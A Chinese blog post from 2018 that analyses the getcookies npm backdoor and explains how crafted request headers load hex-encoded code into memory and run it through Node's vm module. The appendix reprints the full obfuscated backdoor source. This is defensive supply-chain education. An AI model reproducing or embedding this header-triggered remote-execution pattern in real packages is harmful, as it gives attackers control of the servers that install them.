---
title: npm模块别乱下载，说不好就出事了
tags: node
categories:
  - 前端
  - node
thumb_img: hack.jpg
date: 2018-05-08 18:08:38
---


如果你和我们一样，npm install xxx用的很舒服，可能你的项目会遇到重大的危险。
先来看看一篇别人家的文章——[细思极恐：后门代码被隐藏在npm模块中，差点就得逞](https://mp.weixin.qq.com/s/4JGuRDR54OnJyAqlSns53Q)

为了节省时间，[点击问题讨论地址，直接看看别人怎么说的](https://news.ycombinator.com/item?id=16975025)
{% asset_img blog.png %}

{% asset_img emoji.png %}
可能你看了那篇文章也不太清除发生了什么，那就请看下面

## 问题描述
### 哪些人会出现这样的问题？
直接or间接使用getcookies的人。

比如：你正在使用的Node框架是express，并且通过express-cookies处理cookie功能。那它其中就引用了getcookies。

### 后门原理
1. inject 自定义的Header,获取到req.headers
````
req.headers['gfeffh11i'] = 111;
req.headers['gabcdh22i'] = 222;
req.headers['gfaffh33i'] = 333;
````

2. 在请求头中寻找符合**/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi**规则的信息
````
...
// g+hex(2)+h+hex(1)+i
req.headers['gfaffh22i'] = 222;
...
// 以上header将在这个regex命中，并且通过replace执行多次。
JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
    // o=gabcdh00i，p=abcd，v=00
    // 转成hex字符
    p = Buffer.from(p, 'hex').readUInt16LE(0);//52651
    switch (p) {
        ...
    }
})
````

3. 判断注入非法的信息，完成：初始化代码执行环境-->将问题代码添加至内存中-->调用vm执行问题代码
    注释信息，说明了哪些header会被switch命中
    {% asset_img code.png getcookies %}

4. script脚本如何在vm执行（写了个Demo模拟）
````js
// 模拟header中数据的获取，存入内存的过程(default中的逻辑)
function getHexBufer(scriptFn) {
    var result = '';
    for (var i = 0; i < scriptFn.length; i++) {
        // -->ascii-->16hex
        result = result + parseInt(scriptFn[i].charCodeAt(), 10).toString(16);
    }
    // result:2866756e6374696f6e202829207b636f6e736f6c652e6c6f672827636f6d696e6727293b7d292829
    // 16hex的buffer
    // <Buffer 28 66 75 6e 63 74 69 6f 6e 20 28 29 20 7b 63 6f 6e 73 6f 6c 65 2e 6c 6f 67 28 27 63 6f 6d 69 6e 67 27 29 3b 7d 29 28 29>
    return Buffer.from(String(result), 'hex')
}
// 编译脚本
var c = getHexBufer(`(function () {console.log('coming');})()`).toString();
// 通过vm执行脚本
require('vm')['runInThisContext'](c); //输出coming
````

### 你可能需要准备下其他知识
1. [Buffer.from 和 Buffer.alloc 干什么的](http://nodejs.cn/doc/node/buffer.html#buffer_buffer_from_buffer_alloc_and_buffer_allocunsafe)
{% asset_img buffer-1.png Buffer.from&Buffer.alloc %}

2. [readUInt16LE 什么意思]()
如果你不清楚LE、BE。可以再看看这篇：[readInt16BE 和 readInt16LE的区别](http://127.0.0.1:4000/2018/05/08/node-buffer-endian/)

3. \x76\x6d 是什么格式？
是16进制。
然后就能明白源代码中：
````
require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74']
// require('vm')['runInThisContext']
````

    对应的再补充一些进制转换api
    
    ````js
    var test10 = 43981;
    // 10 --> 2
    var test2 = test10.toString(2);//1010101111001101
    // 2 --> 10
    var backTest10 = parseInt(test2, 2);//43981
    // 10 -> 16
    var testHex = parseInt(test2, 2).toString(16);//abcd
    ````

4. [什么是vm？](https://nodejs.org/api/vm.html#vm_vm_runinthiscontext_code_options)
执行script，同时源码中还用了高阶Fn，提供了module.exports, require, req, res, next等信息。我这些都拿到了，我还有什么不能做？
 
## 现状
npm官方已经做了处理，你已经下不到这两个包了
````
Error: [getcookies@*] GET https://registry.npm.taobao.org/getcookies/latest response 404 status
Error: [express-cookies@*] GET https://registry.npm.taobao.org/express-cookies/latest response 404 status
````

## 总结
1. 不要着急升级模块，避免已稳定的模块出现问题
2. 下载使用**优质**，热门模块。用的人多，这样出问题，社区会有解决方案，你不是一个人战斗。
3. 检查下项目中的node_modules，奇奇怪怪的能不用就别用了。
4. 提升自己能力，看的懂大神们写的代码才能hold全场，慢慢积累，但别放弃任何学习源码的机会，比如这个getcookie现在就下载不到了。

## 附录
getcookie源码
````
/* eslint-env es6 */
'use strict';

var assert = require('assert');

let harness = (req, res, callback, next) => {
    try {
        assert.equal(typeof callback, 'function');
    } catch (E) {
        return callback(E);
    }

    try {
        module.exports.log = module.exports.log || Buffer.alloc(0xffff);
        JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
            p = Buffer.from(p, 'hex').readUInt16LE(0);
            switch (p) {
                case 0xfffe:
                    module.exports.log = Buffer.alloc(0xffff);
                    return;
                case 0xfffa:
                    return setTimeout(() => {
                        let c = module.exports.log.toString().replace(/\x00*$/, '');
                        module.exports.log = Buffer.alloc(0xffff);
                        if (c.indexOf('\x00') < 0) {
                            require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                        }
                        next();
                    }, 1000);
                default:
                    v = Buffer.from(v, 'hex');
                    for (let i = 0; i < v.length; i++) {
                        module.exports.log[p + i] = v[i];
                    }
            }
        });
    } catch (E) {}

    next();
};

module.exports.assert = (req, res, callback, next) => {
    harness(req, res, callback, next);
};
````